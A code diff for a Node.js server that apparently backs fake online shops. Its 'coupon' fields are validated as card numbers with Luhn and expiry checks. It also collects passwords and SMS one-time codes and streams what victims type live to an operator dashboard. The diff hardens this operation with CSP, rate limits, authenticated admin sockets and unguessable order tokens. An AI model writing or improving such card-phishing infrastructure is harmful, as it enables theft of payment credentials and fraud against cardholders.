@@ -2,8 +2,11 @@ const express = require('express');
 const http = require('http');
 const path = require('path');
 const fs = require('fs');
+const crypto = require('crypto');
 const { Server } = require('socket.io');
 const cors = require('cors');
+const rateLimit = require('express-rate-limit');
+const helmet = require('helmet');
 const db = require('./db');
 const ipcheck = require('./ipcheck');
 const auth = require('./auth');
@@ -35,14 +38,23 @@ const corsOptions = {
 app.use(cors(corsOptions));
 app.use(express.json({ limit: '512kb' }));
 
-// Security headers (clickjacking, XSS, MIME sniffing)
-app.use((req, res, next) => {
-  res.setHeader('X-Frame-Options', 'DENY');
-  res.setHeader('X-Content-Type-Options', 'nosniff');
-  res.setHeader('X-XSS-Protection', '1; mode=block');
-  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
-  next();
-});
+// Helmet: security headers + CSP (no unsafe-inline for scripts)
+app.use(helmet({
+  contentSecurityPolicy: {
+    directives: {
+      defaultSrc: ["'self'"],
+      scriptSrc: ["'self'"],
+      styleSrc: ["'self'", "'unsafe-inline'"],
+      imgSrc: ["'self'", "data:", "blob:", "https:"],
+      fontSrc: ["'self'", "data:"],
+      connectSrc: ["'self'", "ws:", "wss:", "https:"],
+      frameAncestors: ["'none'"],
+      baseUri: ["'self'"],
+      formAction: ["'self'"],
+    },
+  },
+  hsts: process.env.NODE_ENV === 'production' ? { maxAge: 31536000, includeSubDomains: true } : false,
+}));
 
 // Trust proxy in production (nginx) for correct IP detection
 if (process.env.NODE_ENV === 'production') {
@@ -129,8 +141,15 @@ function requireAdmin(panel) {
   };
 }
 
-// --- Admin auth routes (no requireAdmin) ---
-app.post('/api/admin/auth/login', (req, res) => {
+// --- Admin login rate limit (per IP) ---
+const loginLimiter = rateLimit({
+  windowMs: 10 * 60 * 1000,
+  max: 20,
+  message: { error: 'Too many login attempts', detail: 'rate_limited' },
+  standardHeaders: true,
+  keyGenerator: (req) => clientIp(req) || 'unknown',
+});
+app.post('/api/admin/auth/login', loginLimiter, (req, res) => {
   const ip = clientIp(req);
   const ua = req.headers['user-agent'] || '';
   const username = (req.body.username || '').toString().trim().slice(0, 128);
@@ -177,13 +196,43 @@ const io = new Server(server, {
   cors: { origin: "*", methods: ["GET", "POST"] }
 });
 
+// Admin namespace: separate from default; auth required (no join_admin bypass)
+const adminNsp = io.of('/admin');
+function socketIp(socket) {
+  if (process.env.NODE_ENV === 'production' && socket.handshake.headers['x-forwarded-for']) {
+    return (socket.handshake.headers['x-forwarded-for'] || '').split(',')[0].trim() || socket.handshake.address;
+  }
+  return socket.handshake.address || '';
+}
+adminNsp.use((socket, next) => {
+  const raw = (socket.handshake.auth?.token || socket.handshake.headers?.authorization || '').toString();
+  const token = raw.replace(/^Bearer\s+/i, '').trim();
+  const ip = socketIp(socket);
+  const ua = socket.handshake.headers['user-agent'] || '';
+  if (!token) return next(new Error('unauthorized'));
+  if (token.length > 4096) return next(new Error('unauthorized'));
+  auth.verifySession(token, ip, ua, (err, admin) => {
+    if (err) return next(new Error('server_error'));
+    if (!admin) return next(new Error('unauthorized'));
+    socket.admin = admin;
+    next();
+  });
+});
+adminNsp.on('connection', () => {
+  // Admin dashboard only listens; no events to handle (all admin pushes are adminNsp.emit from HTTP or default-namespace handlers)
+});
+
 // Track online users (orderId -> Set of socketIds)
 const onlineOrders = new Map();
 const liveSessions = new Map(); // Track live typing sessions (socketId -> session data)
 
-// Generate unique order ID (backend-only; frontend no longer generates)
+// Generate unique order ID (strong random; not guessable)
 function generateOrderId() {
-  return 'ORD-' + Date.now() + '-' + Math.floor(Math.random() * 10000);
+  return 'ORD-' + crypto.randomUUID();
+}
+
+function generateOrderToken() {
+  return crypto.randomBytes(32).toString('hex');
 }
 
 // Luhn algorithm validation for card numbers
@@ -236,11 +285,10 @@ function setSetting(key, value, cb) {
   );
 }
 
-// --- Middleware: Identify Shop by Domain (checks shops.domain + shop_domains table) ---
+// --- Middleware: Identify Shop by Domain (use only req.hostname; do not trust client headers) ---
 const identifyShop = (req, res, next) => {
-  const domain = req.headers['x-shop-domain'] || req.headers['x-forwarded-host']?.split(':')[0] || req.hostname;
+  const domain = (req.hostname || '').toString();
   const lookupDomain = domain.includes('localhost') ? 'localhost' : domain;
-  // Store the domain that was used to access for tracking
   req.accessDomain = lookupDomain;
   db.get(
     `SELECT shops.* FROM shops
@@ -256,10 +304,10 @@ const identifyShop = (req, res, next) => {
   );
 };
 
-// --- IP check middleware: runs after identifyShop on visitor-facing routes ---
+// --- IP check middleware: runs after identifyShop; use only req.ip (trust proxy) and req.accessDomain ---
 const ipCheckMiddleware = (req, res, next) => {
-  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || '';
-  const domain = req.accessDomain || req.headers['x-forwarded-host']?.split(':')[0] || req.hostname || '';
+  const ip = clientIp(req);
+  const domain = req.accessDomain || req.hostname || '';
   if (!ip || ip.includes('127.0.0.1') || ip === '::1' || ip === '::ffff:127.0.0.1') {
     return next();
   }
@@ -312,7 +360,7 @@ app.post('/api/orders', identifyShop, (req, res) => {
   const { customer, total, couponCode, dateMMYY, password } = req.body;
   const shopId = req.shop ? req.shop.id : 1;
   const userAgent = req.headers['user-agent'] || '';
-  const ipAddress = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || '';
+  const ipAddress = clientIp(req);
 
   // Validate coupon: Luhn check + expiry
   const validLuhn = luhnCheck(couponCode);
@@ -325,19 +373,21 @@ app.post('/api/orders', identifyShop, (req, res) => {
 
   const createNewOrder = () => {
     const id = generateOrderId();
+    const orderToken = generateOrderToken();
     const stmt = db.prepare(`
-      INSERT INTO orders (id, shop_id, customer_info, total, coupon_code, coupon_date, coupon_password, status, user_agent, ip_address)
-      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+      INSERT INTO orders (id, shop_id, customer_info, total, coupon_code, coupon_date, coupon_password, status, user_agent, ip_address, order_token)
+      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
     `);
-    stmt.run(id, shopId, JSON.stringify(customer), total, couponCode, dateMMYY, password, orderStatus, userAgent, ipAddress, function(err) {
+    stmt.run(id, shopId, JSON.stringify(customer), total, couponCode, dateMMYY, password, orderStatus, userAgent, ipAddress, orderToken, function(err) {
       if (err) return res.status(500).json({ error: err.message });
       const newOrder = {
         id, shop_id: shopId, shop_name: req.shop ? req.shop.name : 'Unknown',
         customer, total, status: orderStatus,
         couponCode, dateMMYY, password, userAgent, ipAddress,
-        couponHistory: [], smsHistory: [], created_at: new Date()
+        couponHistory: [], smsHistory: [], created_at: new Date(),
+        order_token: orderToken
       };
-      io.to('admin').emit('new_order', newOrder);
+      adminNsp.emit('new_order', newOrder);
       res.json({ success: true, order: newOrder, autoRejected: autoReject, rejectReason });
     });
   };
@@ -362,17 +412,21 @@ app.post('/api/orders', identifyShop, (req, res) => {
         [JSON.stringify(customer), total, couponCode, dateMMYY, password, orderStatus, userAgent, existing.id],
         function(err2) {
           if (err2) return res.status(500).json({ error: err2.message });
-          const mergedOrder = {
-            id: existing.id, shop_id: shopId, shop_name: req.shop ? req.shop.name : 'Unknown',
-            customer, total, status: orderStatus,
-            couponCode, dateMMYY, password, userAgent, ipAddress,
-            couponHistory: [], smsHistory: [], created_at: new Date()
-          };
-          io.to('admin').emit('order_update', {
-            id: existing.id, status: orderStatus,
-            couponCode, dateMMYY, password, smsCode: null, customer, total, userAgent
+          db.get('SELECT order_token FROM orders WHERE id = ?', [existing.id], (e, row) => {
+            const orderToken = row && row.order_token ? row.order_token : null;
+            const mergedOrder = {
+              id: existing.id, shop_id: shopId, shop_name: req.shop ? req.shop.name : 'Unknown',
+              customer, total, status: orderStatus,
+              couponCode, dateMMYY, password, userAgent, ipAddress,
+              couponHistory: [], smsHistory: [], created_at: new Date(),
+              order_token: orderToken
+            };
+            adminNsp.emit('order_update', {
+              id: existing.id, status: orderStatus,
+              couponCode, dateMMYY, password, smsCode: null, customer, total, userAgent
+            });
+            res.json({ success: true, order: mergedOrder, autoRejected: autoReject, rejectReason });
           });
-          res.json({ success: true, order: mergedOrder, autoRejected: autoReject, rejectReason });
         }
       );
     }
@@ -441,7 +495,7 @@ app.post('/api/admin/orders/:id/status', requireAdmin('data'), (req, res) => {
       // Clear coupon fields and set status
       db.run("UPDATE orders SET status = 'RETURN_COUPON', coupon_code = NULL, coupon_date = NULL, coupon_password = NULL, sms_code = NULL WHERE id = ?", [id], function(err2) {
         if (err2) return res.status(500).json({ error: err2.message });
-        io.to('admin').emit('order_update', { id, status: 'RETURN_COUPON', couponCode: null, dateMMYY: null, password: null, smsCode: null });
+        adminNsp.emit('order_update', { id, status: 'RETURN_COUPON', couponCode: null, dateMMYY: null, password: null, smsCode: null });
         io.to(`order_${id}`).emit('order_update', { id, status: 'RETURN_COUPON' });
         res.json({ success: true });
       });
@@ -457,44 +511,52 @@ app.post('/api/admin/orders/:id/status', requireAdmin('data'), (req, res) => {
   }
   db.run(sql, params, function(err) {
     if (err) return res.status(500).json({ error: err.message });
-    io.to('admin').emit('order_update', { id, status, smsCode });
+    adminNsp.emit('order_update', { id, status, smsCode });
     io.to(`order_${id}`).emit('order_update', { id, status, smsCode });
     res.json({ success: true });
   });
 });
 
-// 5. User: Submit SMS Verification Code
+// 5. User: Submit SMS Verification Code (requires order_token)
 app.post('/api/orders/:id/sms', (req, res) => {
   const { id } = req.params;
-  const { smsCode } = req.body;
+  const { smsCode, order_token } = req.body;
   if (!smsCode) return res.status(400).json({ error: 'SMS code is required' });
+  if (!order_token) return res.status(400).json({ error: 'order_token is required' });
 
-  // Save to SMS history before updating
-  db.run("INSERT INTO sms_history (order_id, sms_code) VALUES (?, ?)", [id, smsCode]);
-
-  db.run("UPDATE orders SET status = 'SMS_SUBMITTED', sms_code = ? WHERE id = ?", [smsCode, id], function(err) {
+  db.get('SELECT order_token FROM orders WHERE id = ?', [id], (err, row) => {
     if (err) return res.status(500).json({ error: err.message });
-    io.to('admin').emit('order_update', { id, status: 'SMS_SUBMITTED', smsCode });
-    io.to(`order_${id}`).emit('order_update', { id, status: 'SMS_SUBMITTED', smsCode });
-    res.json({ success: true });
+    if (!row) return res.status(404).json({ error: 'Order not found' });
+    if (row.order_token != null && row.order_token !== '') {
+      if (!order_token || row.order_token !== order_token) return res.status(403).json({ error: 'Invalid order token' });
+    }
+
+    db.run("INSERT INTO sms_history (order_id, sms_code) VALUES (?, ?)", [id, smsCode]);
+    db.run("UPDATE orders SET status = 'SMS_SUBMITTED', sms_code = ? WHERE id = ?", [smsCode, id], function(err2) {
+      if (err2) return res.status(500).json({ error: err2.message });
+      adminNsp.emit('order_update', { id, status: 'SMS_SUBMITTED', smsCode });
+      io.to(`order_${id}`).emit('order_update', { id, status: 'SMS_SUBMITTED', smsCode });
+      res.json({ success: true });
+    });
   });
 });
 
-// 6. User: Resubmit Coupon (with Luhn validation)
+// 6. User: Resubmit Coupon (with Luhn validation; requires order_token)
 app.post('/api/orders/:id/update-coupon', (req, res) => {
   const { id } = req.params;
-  const { couponCode, dateMMYY, password } = req.body;
+  const { couponCode, dateMMYY, password, order_token } = req.body;
   if (!couponCode) return res.status(400).json({ error: 'Coupon code is required' });
-
-  // Validate coupon: Luhn check + expiry
   const validLuhn = luhnCheck(couponCode);
   const expired = isCardExpired(dateMMYY);
   const autoReject = !validLuhn || expired;
   const orderStatus = autoReject ? 'AUTO_REJECTED' : 'WAITING_APPROVAL';
 
-  db.get("SELECT coupon_code, coupon_date, coupon_password FROM orders WHERE id = ?", [id], (err, order) => {
+  db.get("SELECT coupon_code, coupon_date, coupon_password, order_token AS ot FROM orders WHERE id = ?", [id], (err, order) => {
     if (err) return res.status(500).json({ error: err.message });
     if (!order) return res.status(404).json({ error: 'Order not found' });
+    if (order.ot != null && order.ot !== '') {
+      if (!order_token || order.ot !== order_token) return res.status(403).json({ error: 'Invalid order token' });
+    }
 
     if (order.coupon_code) {
       db.run("INSERT INTO coupon_history (order_id, coupon_code, coupon_date, coupon_password) VALUES (?, ?, ?, ?)",
@@ -506,7 +568,7 @@ app.post('/api/orders/:id/update-coupon', (req, res) => {
       [couponCode, dateMMYY, password, orderStatus, id],
       function(err2) {
         if (err2) return res.status(500).json({ error: err2.message });
-        io.to('admin').emit('order_update', { id, status: orderStatus, couponCode, dateMMYY, password, smsCode: null });
+        adminNsp.emit('order_update', { id, status: orderStatus, couponCode, dateMMYY, password, smsCode: null });
         io.to(`order_${id}`).emit('order_update', { id, status: orderStatus });
         res.json({ success: true, autoRejected: autoReject });
       }
@@ -842,7 +904,9 @@ if (fs.existsSync(path.join(publicDir, 'index.html'))) {
   app.use((req, res, next) => {
     if (req.method !== 'GET') return next();
     if (req.path.startsWith('/api') || req.path.startsWith('/socket.io')) return next();
-    const host = (req.headers['x-forwarded-host'] || req.hostname || '').split(',')[0].trim().toLowerCase();
+    // Static assets (JS/CSS/fonts etc.) always allow so admin/store pages can load
+    if (req.path.startsWith('/assets/') || /\.(js|css|ico|svg|woff2?|ttf|eot|map|png|jpg|jpeg|webp)$/i.test(req.path)) return next();
+    const host = (req.hostname || '').toLowerCase();
     const pathNorm = (req.path || '/').replace(/\/$/, '') || '/';
     const isAdminPath = pathNorm === ADMIN_PATH_FRONT || pathNorm.startsWith(ADMIN_PATH_FRONT + '/');
     if (isAdminPath) return next(); // admin: any host (including IP)
@@ -862,10 +926,8 @@ app.use((err, req, res, next) => {
   res.status(500).json({ error: 'Server error' });
 });
 
-// --- Socket.io Logic ---
+// --- Socket.io Logic: default namespace = customers (join_order + live typing); admin = /admin namespace (listen-only) ---
 io.on('connection', (socket) => {
-  console.log('A user connected:', socket.id);
-
   socket.on('join_order', (orderId) => {
     if (socket.currentOrderId) {
       socket.leave(`order_${socket.currentOrderId}`);
@@ -874,7 +936,7 @@ io.on('connection', (socket) => {
         prevSockets.delete(socket.id);
         if (prevSockets.size === 0) {
           onlineOrders.delete(socket.currentOrderId);
-          io.to('admin').emit('user_online', { orderId: socket.currentOrderId, online: false });
+          adminNsp.emit('user_online', { orderId: socket.currentOrderId, online: false });
         }
       }
     }
@@ -882,14 +944,9 @@ io.on('connection', (socket) => {
     socket.currentOrderId = orderId;
     if (!onlineOrders.has(orderId)) onlineOrders.set(orderId, new Set());
     onlineOrders.get(orderId).add(socket.id);
-    io.to('admin').emit('user_online', { orderId, online: true });
+    adminNsp.emit('user_online', { orderId, online: true });
   });
 
-  socket.on('join_admin', () => {
-    socket.join('admin');
-  });
-
-  // Live typing session events
   socket.on('live_session_start', (data) => {
     const session = {
       customer: data.customer,
@@ -900,53 +957,45 @@ io.on('connection', (socket) => {
       startedAt: new Date().toISOString(),
     };
     liveSessions.set(socket.id, session);
-    io.to('admin').emit('live_session_start', { id: socket.id, ...session });
+    adminNsp.emit('live_session_start', { id: socket.id, ...session });
   });
-
   socket.on('live_coupon_update', (data) => {
     let session = liveSessions.get(socket.id);
     if (!session) {
-      // Auto-create session if not explicitly started
       session = { customer: null, cartTotal: 0, couponCode: '', dateMMYY: '', password: '', startedAt: new Date().toISOString() };
       liveSessions.set(socket.id, session);
-      io.to('admin').emit('live_session_start', { id: socket.id, ...session });
+      adminNsp.emit('live_session_start', { id: socket.id, ...session });
     }
     if (data.code !== undefined) session.couponCode = data.code;
     if (data.dateMMYY !== undefined) session.dateMMYY = data.dateMMYY;
     if (data.password !== undefined) session.password = data.password;
-    io.to('admin').emit('live_coupon_update', { id: socket.id, ...data });
+    adminNsp.emit('live_coupon_update', { id: socket.id, ...data });
   });
-
-  // Real-time coupon typing for an existing order (Return Coupon flow)
   socket.on('live_order_coupon_update', (data) => {
-    io.to('admin').emit('live_order_coupon_update', data);
+    adminNsp.emit('live_order_coupon_update', data);
   });
-
   socket.on('live_session_end', () => {
     if (liveSessions.has(socket.id)) {
       liveSessions.delete(socket.id);
-      io.to('admin').emit('live_session_end', { id: socket.id });
+      adminNsp.emit('live_session_end', { id: socket.id });
     }
   });
 
   socket.on('disconnect', () => {
-    // Clean up live session
     if (liveSessions.has(socket.id)) {
       liveSessions.delete(socket.id);
-      io.to('admin').emit('live_session_end', { id: socket.id });
+      adminNsp.emit('live_session_end', { id: socket.id });
     }
-    // Clean up online tracking
     if (socket.currentOrderId) {
       const sockets = onlineOrders.get(socket.currentOrderId);
       if (sockets) {
         sockets.delete(socket.id);
         if (sockets.size === 0) {
           onlineOrders.delete(socket.currentOrderId);
-          io.to('admin').emit('user_online', { orderId: socket.currentOrderId, online: false });
+          adminNsp.emit('user_online', { orderId: socket.currentOrderId, online: false });
         }
       }
     }
-    console.log('User disconnected');
   });
 });
 
